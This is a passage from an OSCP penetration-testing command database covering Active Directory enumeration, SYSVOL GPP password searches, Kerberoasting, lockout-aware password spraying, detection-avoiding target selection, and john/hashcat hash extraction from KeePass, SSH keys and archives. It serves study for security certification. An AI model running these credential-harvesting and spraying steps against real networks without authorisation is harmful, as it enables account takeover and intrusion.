SYSVOL is domain-wide readable - all users can access.

Search pattern:
findstr /S /I cpassword \\<DC>\SYSVOL\<DOMAIN>\Policies\*.xml.

Microsoft patched the ability to SET new GPP passwords (2014) but old passwords remain.

OSCP:
Still found in legacy labs - always check SYSVOL.","high","","","","{""Command not found"": ""Not on Kali. Use online decoder or PowerShell: $key = [byte[]](0x4e,0x99,0x06,0xe8,...); [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.AES]::Create().CreateDecryptor($key,$null).TransformFinalBlock([Convert]::FromBase64String('<CPASSWORD>'),0,[Convert]::FromBase64String('<CPASSWORD>').Length))"", ""Invalid cpassword"": ""Corrupted value. Re-extract from XML: cat \\\\<DC>\\SYSVOL\\<DOMAIN>\\Policies\\<GUID>\\*.xml | findstr cpassword""}","","[""search-share-files"", ""enum4linux-smb""]","","[""crackmapexec-smb-spray"", ""evil-winrm-creds"", ""crackmapexec-validate-admin""]"
"powerview-find-domainshare-exclude","Find Domain Shares (Exclude Defaults)","enumeration","Find-DomainShare -CheckShareAccess -ExcludeStandard","Enumerate accessible SMB shares excluding default shares (ADMIN$, C$, IPC$)","","","Focus on non-standard shares.

Common finds:
SYSVOL (GPP passwords), NETLOGON (login scripts), Users (SSH keys, .rdp files), IT (tools/scripts).","high","","","","{""No shares found"": ""Remove -CheckShareAccess to see all shares (including non-accessible)""}","{""-CheckShareAccess"": ""Only returns shares you can read (tests access before returning)"", ""-ExcludeStandard"": ""Excludes default Windows shares (ADMIN$, C$, IPC$). Focus on custom shares (Users, IT-Tools, Backups, etc.).""}","[""import-powerview""]","",""
"psloggedon","Enumerate Logged-On Users (PsLoggedOn)","enumeration","PsLoggedOn.exe \\<COMPUTER>","Display locally and remotely logged-on users using Sysinternals PsLoggedOn","","PsLoggedOn.exe \\WS01","Alternative to Get-NetLoggedon when PowerView not available.

Works even when NetSessionEnum API is restricted.

Requires Remote Registry service enabled (disabled by default on Server 2019+/Windows 11+).","medium","","","","{""Access denied"": ""Requires local admin on target. Try alternative: Get-NetLoggedon"", ""RPC server unavailable"": ""Remote Registry service disabled. Common on modern Windows.""}","{""\\\\<COMPUTER>"": ""Target remote computer. Omit to query local machine.""}","","",""
"gpp-password-files","Find GPP Password Files in SYSVOL","enumeration","findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml","Search SYSVOL for Group Policy Preference files containing encrypted passwords","","findstr /S /I cpassword \\corp.com\sysvol\corp.com\policies\*.xml","CRITICAL OSCP technique.

Common files:
Groups.xml (local admin password), ScheduledTasks.xml (task credentials), Services.xml (service accounts).

All authenticated users can read SYSVOL.","high","","","","{""No matches"": ""No GPP passwords in SYSVOL. Try other credential sources (KeePass, web.config, etc.)""}","{""/S"": ""Recursive search through all subdirectories"", ""/I"": ""Case-insensitive search"", ""cpassword"": ""Attribute name for encrypted password in GPP XML files""}","","[""get-gpppassword""]",""
"keepass2john-extract","Extract KeePass Database Hash","enumeration","keepass2john <KEEPASS_DB> > <OUTPUT_FILE>","Convert KeePass database to John/Hashcat compatible hash format","","keepass2john Database.kdbx > keepass.hash","OSCP TIP:
KeePass databases found in:
~/Documents, Desktop, network shares, Downloads.

Search:
find / -name '*.kdbx' 2>/dev/null.

After extraction, REMOVE 'Database:' prefix for Hashcat (keep for John).

Hash format:
$keepass$*2*60*0*hash_data.

The *2* indicates KeePass 2.x, *60* is transform rounds (in thousands).","high","","","","{""Not a valid KeePass file"": ""File corrupted or not KeePass format. Verify: file Database.kdbx (should show 'Keepass password database')"", ""Command not found"": ""Install john: apt install john""}","{""keepass2john"": ""Extraction tool from JtR suite. Extracts master password hash from KeePass database. Supports KeePass 1.x and 2.x formats. Output format: filename:$keepass$*version*rounds*...*hash. For Hashcat: remove 'filename:' prefix. For John: use as-is.""}","","","[""hashcat-keepass-crack"", ""john-keepass-crack""]"
"ssh2john-extract","Extract SSH Private Key Hash","enumeration","ssh2john <PRIVATE_KEY> > <OUTPUT_FILE>","Convert SSH private key to John/Hashcat compatible hash format","","ssh2john id_rsa > ssh.hash","OSCP TIP:
SSH keys found in:
~/.ssh/id_rsa, /root/.ssh/id_rsa, web server file disclosure, backup files.

Search:
find / -name id_rsa 2>/dev/null.

After extraction, check hash for cipher:
$sshng$X$ where X=cipher indicator ($6$=aes-256-cbc, etc.).

Modern keys often use aes-256-ctr (John only, NOT Hashcat).

Remove 'id_rsa:' prefix before cracking.","high","","","","{""Not an encrypted key"": ""SSH key has no passphrase - can use directly without cracking. Test: ssh -i id_rsa user@target (if no passphrase prompt = no encryption)"", ""Token length exception in Hashcat"": ""SSH key uses aes-256-ctr cipher (Hashcat unsupported). Use John the Ripper instead""}","{""ssh2john"": ""Extraction tool from JtR suite. Extracts passphrase hash from encrypted SSH private keys. Supports RSA, DSA, EC keys. Supports all OpenSSH ciphers (aes-256-cbc, aes-256-ctr, etc.). Output format: filename:$sshng$*cipher*...*hash. For Hashcat: remove 'filename:' prefix AND verify cipher support (mode 22921 = aes-256-cbc only). For John: use as-is (supports all ciphers).""}","","","[""hashcat-ssh-key-crack"", ""john-ssh-key-crack""]"
"zip2john-extract","Extract Encrypted ZIP Hash","enumeration","zip2john <ZIP_FILE> > <OUTPUT_FILE>","Convert encrypted ZIP file to crackable hash format","","zip2john encrypted.zip > zip.hash","ZIP files often contain:
backup data, sensitive documents, password lists.

After cracking, extract with:
unzip encrypted.zip (enter cracked password).

Check if ZIP actually requires password:
unzip -l encrypted.zip (if succeeds = no password needed).","medium","","","","","{""zip2john"": ""Extraction tool for password-protected ZIP archives. Extracts hash from ZIP encryption metadata. Supports ZipCrypto (traditional) and AES encryption. Output includes all encrypted files in archive. Multiple files = multiple hash lines (crack any to access all if same password).""}","","","[""john-wordlist-attack""]"
"rar2john-extract","Extract Encrypted RAR Hash","enumeration","rar2john <RAR_FILE> > <OUTPUT_FILE>","Convert encrypted RAR archive to crackable hash format","","rar2john encrypted.rar > rar.hash","RAR5 uses much stronger encryption than RAR3 (similar to bcrypt slowness).

After cracking, extract with:
unrar x encrypted.rar (or 7z x encrypted.rar).","medium","","","","","{""rar2john"": ""Extraction tool for password-protected RAR archives. Supports RAR3 and RAR5 formats. RAR5 significantly slower to crack (stronger KDF). Output format indicates RAR version. Single password for all files in archive.""}","","",""
"office2john-extract","Extract Microsoft Office Document Hash","enumeration","office2john <OFFICE_FILE> > <OUTPUT_FILE>","Convert password-protected Office documents to crackable hash","","office2john encrypted.docx > office.hash","Office 2007+ uses AES encryption (slow cracking).

Focus on targeted wordlists.

Common scenario:
password-protected spreadsheets with credentials, macros, sensitive data.","medium","","","","","{""office2john"": ""Extraction tool for password-protected Office documents (Word, Excel, PowerPoint). Supports Office 2007+ formats (.docx, .xlsx, .pptx). Uses strong encryption (AES) - slow cracking. Output indicates Office version and encryption type.""}","","",""
"hash-identifier","Identify Hash Type","enumeration","hash-identifier","Interactive hash type identifier tool","","","OSCP TIP:
Hash identification by characteristics - Length 32 hex:
MD5/MD4/MD2/NTLM, Length 40 hex:
SHA1, Length 64 hex:
SHA256.

Context helps:
Windows = NTLM, Linux /etc/shadow = sha512crypt ($6$), Web apps = MD5/bcrypt.

Cannot always distinguish - may need to try multiple modes.","medium","","","","","{""hash-identifier"": ""Interactive tool - paste hash, get possible hash types. Lists multiple possibilities (many hashes look similar - MD2/MD4/MD5 all 32 hex chars). Use context clues (source system, application) to determine correct type. Alternative: hashid (command-line, non-interactive).""}","","",""
"hashid","Hashid - Modern Hash Identifier","enumeration","hashid '<HASH>' -m","Identify hash type with Hashcat/John mode numbers","","hashid '5f4dcc3b5aa765d61d8327deb882cf99' -m","OSCP TIP:
Use hashid instead of hash-identifier for modern workflows.

Command-line (scriptable) + shows exact modes for Hashcat/John.

Example:
hashid '$6$rounds=5000$...' -m  identifies sha512crypt with Hashcat mode 1800 and JtR format sha512crypt.

Quote hashes to prevent shell interpretation of special chars ($, !).","high","","","","","{""-m"": ""Mode numbers - Display Hashcat (-m) and John (--format) mode numbers for identified hash types. Extremely useful - directly tells you which mode to use. Saves time vs manual lookup in --help.""}","","[""hash-identifier"", ""hash-identifier-run""]","[""hashcat-benchmark"", ""hash-rate-benchmark"", ""hashcat-crack"", ""john-crack""]"
"pdf2john-extract","Extract PDF Password Hash","enumeration","pdf2john <PDF_FILE> > <OUTPUT_FILE>","Convert password-protected PDF to crackable hash","","pdf2john encrypted.pdf > pdf.hash","PDFs often contain:
documentation, password lists, network diagrams.

Two password types:
user (viewing) and owner (editing).

May only need user password for access.","low","","","","","{""pdf2john"": ""Extraction tool for password-protected PDFs. PDFs can have two password types: 1) User password (open document), 2) Owner password (modify/print). Tool extracts both if present. PDF encryption varies - some versions weaker than others.""}","","",""
"python-hash-generator","Generate Hash for Testing","enumeration","echo -n '<PASSWORD>' | md5sum","Generate MD5 hash for testing/verification","","echo -n 'password123' | md5sum","OSCP TIP:
Verify crack success by regenerating hash.

Example:
Cracked password = 'secret1', verify:
echo -n 'secret1' | sha256sum (compare to original hash).

Use for understanding:
same plaintext  same hash, different plaintext  different hash.

Generate test hashes:
for pw in pass password 123456; do echo -n ""$pw"" | md5sum; done","low","","","","","{""echo -n"": ""No newline - Essential flag! Without -n, newline is appended to string, changing the hash. Compare: echo 'test' | md5sum (includes \\n) vs echo -n 'test' | md5sum (excludes \\n). Always use -n for password hashing."", ""md5sum"": ""Generate MD5 hash. Alternatives: sha1sum, sha256sum, sha512sum. Used for: 1) Testing hash cracking setup 2) Verifying cracked passwords 3) Understanding hash behavior""}","","",""
"base64-decode-hash","Base64 Decode Hash","enumeration","echo '<ENCODED_STRING>' | base64 -d","Decode base64-encoded strings (sometimes contain hashes)","","echo 'cGFzc3dvcmQxMjM=' | base64 -d","Base64 is encoding, NOT encryption.

Some applications store passwords/hashes base64-encoded.

Always try decoding suspicious base64 strings.

Encode:
echo -n 'password123' | base64.

Decode:
echo 'cGFzc3dvcmQxMjM=' | base64 -d","low","","","","","{""base64 -d"": ""Decode base64 - Sometimes passwords/hashes are base64-encoded for transport/storage. Not encryption (easily reversible). Encoding != security. Decode to reveal actual hash or password. Identify base64: Ends with = or ==, uses A-Z, a-z, 0-9, +, /""}","","",""
"net-user-domain-list","List All Domain Users","enumeration","net user /domain","Enumerate all user accounts in the domain using built-in net.exe","","","OSCP TRAINING MATERIAL - DOMAIN USER ENUMERATION WITH NET.EXE:
WHAT IS NET USER /DOMAIN:
Built-in Windows command-line tool for enumerating domain user accounts.

Available on all Windows versions (XP through 11) without requiring PowerShell, RSAT, or administrative privileges.

WHY USE THIS FIRST:
- No installation required:
Works immediately on compromised Windows host
- No special privileges:
Any domain user can enumerate domain accounts
- Fast execution:
Returns results in <5 seconds typically
- Baseline enumeration:
Provides complete user list for further targeting

HOW IT WORKS:
1.

net.exe connects to domain controller via NetAPI32

2.

Queries SAM (Security Accounts Manager) database for user objects

3.

Returns list of sAMAccountName values (usernames)

4.

No additional attributes retrieved (groups, descriptions, etc.)

COMMAND EXECUTION:
```cmd
net user /domain
```

EXPECTED OUTPUT:
```
User accounts for \\DC01.corp.com

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
jeff                     jen                      stephanie
iis_service              sql_service              backup_admin
The command completed successfully.
```

OUTPUT INTERPRETATION:
- Default accounts:
Administrator, Guest, krbtgt (always present)
- Regular users:
jeff, jen, stephanie (human users)
- Service accounts:
iis_service, sql_service (likely have SPNs)
- Admin accounts:
backup_admin (naming pattern suggests elevated privileges)

OSCP METHODOLOGY:
1.

INITIAL ENUMERATION:
Run `net user /domain` immediately after gaining access to domain-joined host.

2.

IDENTIFY HIGH-VALUE TARGETS:
- Admin naming patterns:
*admin*, *adm*, *administrator*
- Service accounts:
*svc*, *service*, *sql*, *iis*, *apache*
- Backup accounts:
*backup*, *bkup* (often have SeBackupPrivilege)

3.

ENUMERATE EACH INTERESTING USER:
```cmd
net user administrator /domain
net user sql_service /domain
net user backup_admin /domain
```

4.

CHECK FOR SPNS (Kerberoasting):
```cmd
setspn -L sql_service
setspn -L iis_service
```

LIMITATIONS:
- Username only:
No group memberships, descriptions, or attributes
- No password information:
Cannot see password ages or policies
- No nested group visibility:
Only direct group memberships later
- Requires domain connectivity:
Must reach domain controller

ALTERNATIVES WHEN NET.EXE BLOCKED:
- PowerShell:
`Get-ADUser -Filter * -Properties samaccountname`
- PowerView:
`Get-NetUser`
- LDAP query:
`ldapsearch` from Kali
- Impacket:
`lookupsid.py` from Kali

COMMON FAILURES:
""System error 1355"" (domain not found):
- Not on domain-joined machine
- Domain controller unreachable
- DNS resolution failure
- Fix:
Verify domain membership with `systeminfo | findstr /B /C:""Domain""`

""Access is denied"":
- Not authenticated as domain user
- Local account trying to query domain
- Fix:
Verify with `whoami /user` - should show domain SID

""The request will be processed at a domain controller"":
- DC processing query (normal message)
- Wait 5-10 seconds for response

MANUAL ALTERNATIVE:
From PowerShell (if net.exe blocked):
```powershell
([adsisearcher]""(&(objectCategory=User)(objectClass=User))"").FindAll() | ForEach-Object { $_.Properties.samaccountname }
```

TIME ESTIMATE:
- Command execution:
<5 seconds
- Manual review of output:
30-60 seconds (identify targets)
- Total:
1-2 minutes

EXAM STRATEGY:
1.

Run IMMEDIATELY upon gaining Windows shell access

2.

Save output to file for reference:
```cmd
net user /domain > users.txt
```

3.

Identify 5-10 high-value targets based on naming

4.

Enumerate each with `net user <USERNAME> /domain`

5.

Focus on service accounts for Kerberoasting

6.

Check admin accounts for weak password patterns

WHY THIS MATTERS:
User enumeration is FIRST STEP in every AD attack chain:
- Kerberoasting:
Need usernames with SPNs
- Password spraying:
Need username list
- Targeted attacks:
Identify high-value accounts
- Privilege escalation:
Find admin accounts

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon to DC)
- Event ID 4662:
Object access (user object queries)
- Minimal detection:
Standard domain activity
- Stealthy:
No exploitation, just enumeration","high","","","","{""System error 1355"": ""DC unreachable. Verify domain membership: systeminfo | findstr /B /C:\""Domain\"""", ""Access is denied"": ""Requires domain user credentials. Verify authentication: whoami /user"", ""Network path was not found"": ""DNS resolution issue. Ping DC: ping <DC>""}","{""/domain"": ""Queries the domain controller instead of the local machine. Required to enumerate domain users rather than local accounts. Works from any domain-joined machine without special privileges.""}","","[""get-netuser""]","[""net-user-domain-detail""]"
"net-user-domain-detail","Get Specific Domain User Details","enumeration","net user <USERNAME> /domain","Retrieve detailed information about a specific domain user including group memberships, password policy, and logon information","","net user administrator /domain","OSCP TRAINING MATERIAL - DETAILED DOMAIN USER ENUMERATION:
WHAT IS NET USER <USERNAME> /DOMAIN:
Retrieves comprehensive information about specific domain user account including group memberships, password policy compliance, account status, and logon history.

Essential for identifying high-value targets and understanding account privileges.

CRITICAL OUTPUT FIELDS:
1.

GLOBAL GROUP MEMBERSHIPS:
```
Global Group memberships     *Domain Users         *Domain Admins
```
- Domain Admins = Full domain control (instant win)
- Enterprise Admins = Forest-wide control
- Account Operators = Can create/modify accounts
- Backup Operators = SeBackupPrivilege (read any file)

2.

LOCAL GROUP MEMBERSHIPS:
```
Local Group Memberships      *Administrators
```
Indicates user is local administrator on THIS computer AND likely local admin on other domain computers.

3.

PASSWORD INFORMATION:
```
Password last set            10/15/2023 9:45:23 AM
Password expires             Never
Password changeable          10/15/2023 9:45:23 AM
Password required            Yes
```
- Old password (>1 year):
May be weaker, set before policy changes
- Never expires:
Service account indicator
- Not required:
Rare but exploitable

4.

ACCOUNT STATUS:
```
Account active               Yes
Account expires              Never
Last logon                   11/8/2025 2:15:45 PM
```
- Last logon recent:
Active user (more detection risk)
- Last logon old (>90 days):
Dormant account (stealthy to compromise)
- Account expires:
Temporary accounts (contractors)

5.

LOGON HOURS:
```
Logon hours allowed          All
```
Restricted hours = Potential detection evasion opportunity.

OSCP ATTACK METHODOLOGY:
STEP 1 - IDENTIFY HIGH-VALUE TARGETS:
From `net user /domain` output, target these patterns:
```cmd
net user administrator /domain
net user sql_service /domain
net user backup_admin /domain
net user svc_apache /domain
```

STEP 2 - CHECK GROUP MEMBERSHIPS:
Look for:
- Domain Admins:
Full domain control
- Enterprise Admins:
Forest control
- Administrators:
Local admin rights
- Server Operators:
Can backup/restore files
- Account Operators:
Can modify user accounts

STEP 3 - ASSESS PASSWORD AGE:
```
Password last set            1/15/2019 9:45:23 AM  # 4+ years old!
```
Older passwords:
- May predate strong password policies
- Common patterns:
Company123!, Password2019
- Good Kerberoasting targets

STEP 4 - CHECK FOR SERVICE ACCOUNTS:
Indicators:
- Password expires:
Never
- Logon hours:
All
- Full Name:
""SQL Service Account"" or similar
- Naming:
svc_*, service_*, sql_*, iis_*

Service accounts:
- Often have SPNs (Kerberoastable)
- Rarely changed passwords
- Elevated privileges (local admin, database access)
- Low detection (service logons normal)

STEP 5 - IDENTIFY DORMANT ACCOUNTS:
```
Last logon                   3/22/2023 8:00:00 AM  # 18+ months ago
```
Dormant accounts:
- Lower detection risk (no one monitoring)
- May still have elevated privileges
- Good for persistence (less likely to be noticed)
- Password rarely changed

COMMAND EXAMPLES:
```cmd
REM Enumerate specific user
net user jen /domain

REM Check if user is Domain Admin
net user administrator /domain | findstr /C:""Domain Admins""

REM Find all Domain Admins (from group enumeration)
net group ""Domain Admins"" /domain
```

OUTPUT INTERPRETATION EXAMPLE:
```
User name                    svc_sql
Full Name                    SQL Server Service Account
Global Group memberships     *Domain Users         *Administrators
Local Group Memberships      *Administrators
Password last set            1/5/2018 10:00:00 AM
Password expires             Never
Last logon                   11/10/2025 3:15:00 AM
```

ANALYSIS:
- Service account (naming, ""never expires"")
- Domain Administrators group (CRITICAL)
- Local admin rights
- Old password (7+ years!)
- Recent logon (service active)
- ACTION:
Kerberoast this account  crack offline  lateral movement

LIMITATIONS:
- Single user only:
Must enumerate each username separately
- No SPN visibility:
Use `setspn -L <USERNAME>` to check
- Last logon accuracy:
May not reflect true last logon (cached value)
- No nested groups:
Only shows direct group memberships

COMPARISON TO POWERVIEW:
net.exe:
- Built-in, no installation
- Single user at a time
- No filtering/search
- Clean readable output

PowerView Get-NetUser:
- Requires PowerShell
- Bulk enumeration with filters
- Extensive attributes
- Scriptable/automated

COMMON FAILURES:
""The user name could not be found"":
- Typo in username
- User doesn't exist in domain
- Fix:
List users first with `net user /domain`

""System error 1355"":
- DC unreachable
- Not domain-joined machine
- Fix:
Verify connectivity with `ping <DC>`

""Access is denied"":
- Not authenticated as domain user
- Fix:
Check authentication with `whoami /user`

MANUAL ALTERNATIVE:
PowerShell ADSI query:
```powershell
$user = [ADSI]""LDAP://CN=jen,CN=Users,DC=corp,DC=com""
$user.Properties
```

TIME ESTIMATE:
- Single user query:
<5 seconds
- Enumerating 10 users:
1-2 minutes
- Analysis per user:
15-30 seconds
- Total for 10 users:
3-5 minutes

EXAM STRATEGY:
1.

Run `net user /domain` to get username list

2.

Enumerate 5-10 HIGH-VALUE users:
- administrator
- Any *admin* accounts
- Any *svc* or *service* accounts
- Domain Admins members (from group enum)

3.

Document findings:
```
svc_sql:
Domain Admins, password 7 years old  KERBEROAST
backup_admin:
Backup Operators, dormant 18 months  TARGET
administrator:
Last logon today  HIGH DETECTION RISK
```

4.

Prioritize targets:
- Domain Admin service accounts  Kerberoast first
- Dormant admin accounts  Password spray
- Recent logon admins  Last resort (detection)

KEY INSIGHT:
Group membership = attack vector:
- Domain Admins  Compromise = game over
- Administrators  Lateral movement to computers
- Backup Operators  SeBackupPrivilege (dump SAM/NTDS)
- Account Operators  Create admin accounts
- Server Operators  Service manipulation

FORENSIC ARTIFACTS:
- Event ID 4624:
Network logon to DC (Type 3)
- Event ID 4662:
AD object access (user object query)
- Minimal footprint:
Standard enumeration
- Stealthy:
No modifications, read-only queries","high","","","","{""User name could not be found"": ""Verify spelling. List all users first: net user /domain"", ""System error 1355"": ""DC unreachable. Check network connectivity to domain controller""}","{""/domain"": ""Queries the domain controller for the user account. Without this flag, net.exe searches for a local user account only.""}","[""net-user-domain-list""]","","[""net-group-domain-members""]"
"net-group-domain-list","List All Domain Groups","enumeration","net group /domain","Enumerate all security groups in the domain","","","OSCP METHODOLOGY:
Enumerate all domain groups to identify high-privilege targets.

DEFAULT HIGH-VALUE GROUPS:
- Domain Admins:
Full domain control
- Enterprise Admins:
Forest-wide control
- Administrators:
Local admin on domain computers
- Backup Operators:
SeBackupPrivilege
- Account Operators:
Can create/modify accounts
- Server Operators:
Service management

CUSTOM GROUPS TO TARGET:
Look for naming patterns:
- *Admin*, *IT*, *Service*:
Often have elevated permissions
- *Management*, *Executive*:
May have sensitive data access
- *Development*, *DevOps*:
May have deployment privileges

COMMAND:
  net group /domain

NEXT STEPS:
For each interesting group:
  net group ""<GROUPNAME>"" /domain

Time:
<5 seconds","high","","","","{""System error 1355"": ""Cannot contact DC. Verify domain membership and network connectivity""}","{""/domain"": ""Queries domain groups instead of local groups. Essential for enumerating domain-wide security groups that may grant elevated privileges.""}","","[""get-netgroup""]","[""net-group-domain-members""]"
"net-group-domain-members","List Members of Specific Domain Group","enumeration","net group ""<GROUPNAME>"" /domain","Enumerate all members of a specific domain group to identify high-value targets","","net group ""Domain Admins"" /domain","CRITICAL LIMITATION:
net.exe only lists user objects, NOT nested group objects.

NESTED GROUP DETECTION:
If you see a member name but:
  net user <USERNAME> /domain
fails with ""user not found""  It's a nested group, not a user.

WORKAROUND FOR NESTED GROUPS:
- PowerView:
Get-NetGroupMember -Recurse
- Manual LDAP query from Kali
- Enumerate the nested group:
net group ""<NESTED_GROUP>"" /domain

COMMAND:
  net group ""Domain Admins"" /domain

OSCP PRIORITY:
Domain Admins members = instant win if compromised.
Enumerate each member with net user to find attack vectors.

Time:
<5 seconds per group","high","","","","{""Group name could not be found"": ""Use quotes for group names with spaces. Verify exact name: net group /domain"", ""Nested groups not showing users"": ""net.exe only shows direct members. Use PowerView to unravel nested groups: Get-NetGroupMember -Recurse""}","{""/domain"": ""Queries domain group membership instead of local groups. Critical for identifying users with domain-level privileges.""}","[""net-group-domain-list""]","","[""net-user-domain-detail""]"
"net-accounts-domain","Get Domain Password Policy","enumeration","net accounts /domain","Retrieve domain password policy including minimum length, complexity, lockout threshold, and password age requirements","","","CRITICAL FOR PASSWORD ATTACKS:
Understand domain password policy before attempting password spraying or brute force.

KEY FIELDS:
1.

Lockout threshold:
   How many failed attempts before account lockout.
   - 0 = Unlimited attempts (brute force freely)
   - 5 = Limit to 2-3 attempts per account
   - Common values:
3, 5, 10, or 0

2.

Lockout duration:
   How long account stays locked after threshold reached.
   - 30 minutes = Wait or move to different accounts
   - Forever (until admin unlock) = Very dangerous

3.

Minimum password length:
   Shortest password allowed (typically 8-14 characters).

4.

Password complexity:
   Requirements:
uppercase, lowercase, numbers, symbols.

COMMAND:
  net accounts /domain

OSCP STRATEGY:
- Lockout threshold 0:
Spray unlimited passwords per user
- Lockout threshold 3-5:
Maximum 2 passwords per user
- Lockout threshold 10+:
Can try 5-7 passwords safely

Time:
<5 seconds","high","","","","{""System error 1355"": ""Cannot contact DC. Verify domain connectivity""}","{""/domain"": ""Queries domain password policy instead of local machine policy. Essential for planning password attacks without triggering account lockouts.""}","[""evil-winrm-shell"", ""crackmapexec-validate-admin""]","[""ldapsearch-policy"", ""crackmapexec-policy""]","[""create-policy-rules"", ""hashcat-test-rules""]"
"setspn-list-user","List SPNs for Specific User","enumeration","setspn -L <USERNAME>","List Service Principal Names (SPNs) associated with a specific user account to identify service accounts and potential Kerberoasting targets","","setspn -L svc_sql","WHY SERVICE ACCOUNTS MATTER:
- Elevated privileges (local admin, database access)
- Weak passwords (rarely changed)
- Kerberoastable (offline cracking, no lockout)

SPN FORMAT:
ServiceClass/Host:Port/ServiceName

COMMON SERVICE CLASSES:
- HTTP:
Web servers (IIS, Apache)
- MSSQLSvc:
SQL Server
- TERMSRV:
RDP/Terminal Services
- HOST:
Multiple services

COMMAND:
  setspn -L svc_sql

KERBEROASTING WORKFLOW:
1.

Find user with SPN:
setspn -L <USERNAME>

2.

Request service ticket:
Rubeus.exe kerberoast /user:<USERNAME>

3.

Crack offline:
hashcat -m 13100 ticket.txt wordlist.txt

OSCP ADVANTAGE:
Offline attack - no account lockout risk.

Time:
<5 seconds per user","high","","","","{""No such object"": ""User does not exist. Check spelling: net user /domain"", ""No SPNs registered"": ""Account is not a service account. Try other users with 'svc', 'service', or 'sql' in username""}","{""-L"": ""List SPNs registered for the specified user account. SPNs indicate the account is used to run services and may have elevated privileges.""}","[""net-user-domain-list""]","",""
"setspn-query-all","Query All SPNs in Domain","enumeration","setspn -Q */*","Enumerate all Service Principal Names registered in the domain to discover service accounts and services","","","WHAT THIS REVEALS:
All registered services with hostnames/ports WITHOUT port scanning.

EXAMPLE OUTPUT:
  MSSQLSvc/DB01.corp.com:1433
   SQL Server on DB01, port 1433

  HTTP/WEB01.corp.com
   IIS web server on WEB01

COMMAND:
  setspn -Q */*

HIGH-VALUE SPNS:
- MSSQLSvc:
SQL Server (often elevated privileges)
- HTTP/HTTPS:
IIS web servers
- exchangeMDB:
Exchange servers
- TERMSRV:
RDP services

OSCP WORKFLOW:
1.

Query all SPNs:
setspn -Q */*

2.

Extract usernames from CN= lines

3.

Check each user:
setspn -L <USERNAME>

4.

Kerberoast high-value accounts

Time:
10-30 seconds (depends on domain size)","high","","","","{""Output too large"": ""Pipe to file: setspn -Q */* > spns.txt. Then search: findstr /I \""MSSQLSvc HTTP\"" spns.txt"", ""No such SPN found"": ""No services registered in domain (unlikely). Verify domain connectivity.""}","{""-Q"": ""Query mode - searches for SPNs matching the specified pattern."", ""*/*"": ""Wildcard pattern matching all SPNs in the format ServiceClass/Host. Returns every service registered in the domain.""}","","[""get-netuser""]",""
"dsquery-user","Query Domain Users with dsquery","enumeration","dsquery user","Query Active Directory for user objects using dsquery (built-in AD query tool)","","","dsquery is part of Windows Server RSAT and may not be available on all Windows clients.

Returns Distinguished Names (LDAP format) instead of usernames, requiring additional parsing.

For OSCP, net.exe is more reliable as it's installed by default on all Windows versions.

dsquery is useful when you need LDAP-formatted queries or when net.exe is restricted by policy.","medium","","","","{""dsquery is not recognized"": ""Not installed. dsquery requires Remote Server Administration Tools (RSAT). Use net.exe instead: net user /domain"", ""Access Denied"": ""Requires domain user credentials. Standard domain users can query user objects."", ""Failed to connect"": ""DC unreachable. Verify domain connectivity: ping <DC>""}","{""user"": ""Searches for user objects in Active Directory. Returns distinguished names (DN) in LDAP format.""}","","[""net-user-domain-list"", ""get-netuser""]",""
"dsquery-computer","Query Domain Computers with dsquery","enumeration","dsquery computer","Query Active Directory for computer objects to enumerate domain-joined machines","","","Reveals all domain-joined computers without network scanning.

Domain Controllers are in 'OU=Domain Controllers', servers/workstations in 'CN=Computers' or custom OUs.

Extract hostname from CN= field.

OSCP:
Less useful than net.exe or PowerView since output requires parsing.

Use when net.exe is restricted or you need to query specific OUs with -startnode flag.","medium","","","","{""dsquery is not recognized"": ""RSAT not installed. Use alternative: Get-NetComputer or network scanning"", ""Access Denied"": ""Standard domain users should have read access. Verify credentials: whoami /user""}","{""computer"": ""Searches for computer objects in Active Directory. Returns distinguished names of all domain-joined computers including workstations, servers, and domain controllers.""}","","[""get-netcomputer""]",""
"dsquery-group","Query Domain Groups with dsquery","enumeration","dsquery group","Query Active Directory for group objects to enumerate security groups","","","Returns LDAP distinguished names which require parsing.

net.exe provides cleaner output.

Use dsquery when you need to query specific OUs or when net.exe is restricted.

OSCP:
Stick with net group /domain for exam - faster and cleaner output.","medium","","","","{""dsquery is not recognized"": ""Use net group /domain instead"", ""Output too verbose"": ""Filter for admin groups: dsquery group -name \""*admin*\""""}","{""group"": ""Searches for group objects in Active Directory. Returns distinguished names of all security and distribution groups.""}","","[""net-group-domain-list"", ""get-netgroup""]",""
"net-group-domain-admins","List Domain Admins Group Members","enumeration","net group ""Domain Admins"" /domain","Enumerate members of Domain Admins group using built-in net.exe","","","SHORTCUT COMMAND:
Direct query for Domain Admins group members.

WHY THIS MATTERS:
- Domain Admins = Full domain control
- Identify highest-value compromise targets
- Check for service accounts in this group (Kerberoasting gold)

COMMAND:
  net group ""Domain Admins"" /domain

NEXT STEPS:
Enumerate each member:
  net user <MEMBER> /domain

Time:
<5 seconds","high","","","","{""Group name could not be found"": ""Verify group exists: net group /domain""}","{""/domain"": ""Queries the domain controller for group membership. Required to see domain group members rather than local groups.""}","","","[""net-user-domain-detail""]"
"net-group-domain-computers","List Domain Computers Group","enumeration","net group ""Domain Computers"" /domain","Enumerate computer accounts in the domain","","","Shows all computer accounts in the domain.

Computer names end with $.","medium","","","","","{""/domain"": ""Queries domain controller for computer accounts""}","","[""get-netcomputer""]",""
"net-domain-controllers","Identify Domain Controllers","enumeration","nltest /dclist:<DOMAIN>","List all domain controllers in the domain using nltest","","nltest /dclist:corp.com","IDENTIFY DOMAIN CONTROLLERS:
List all DCs in the domain.

WHY TARGET DCs:
- Hold master copy of AD database (NTDS.dit)
- Contain all domain credentials
- DCSync attacks possible if compromised

COMMAND:
  nltest /dclist:corp.com

OUTPUT:
  PDC = Primary Domain Controller
  Lists all DC hostnames and IPs

Time:
<5 seconds","high","","","","{""Cannot find domain"": ""Verify domain name with: systeminfo | findstr Domain""}","{""/dclist"": ""Lists all domain controllers in the specified domain""}","","[""net-domain-controllers""]",""
"setspn-list-all","List All SPNs in Domain","enumeration","setspn -T <DOMAIN> -Q */*","Enumerate all Service Principal Names (SPNs) in the domain for Kerberoasting","","setspn -T corp.com -Q */*","ENUMERATE ALL SPNS IN DOMAIN:
Discover Kerberoasting targets domain-wide.

COMMAND:
  setspn -T corp.com -Q */*

WHAT TO LOOK FOR:
- USER accounts with SPNs (Kerberoastable)
- Ignore COMPUTER$ accounts (not crackable)

FOCUS ON:
- MSSQLSvc:
SQL service accounts
- HTTP:
Web service accounts
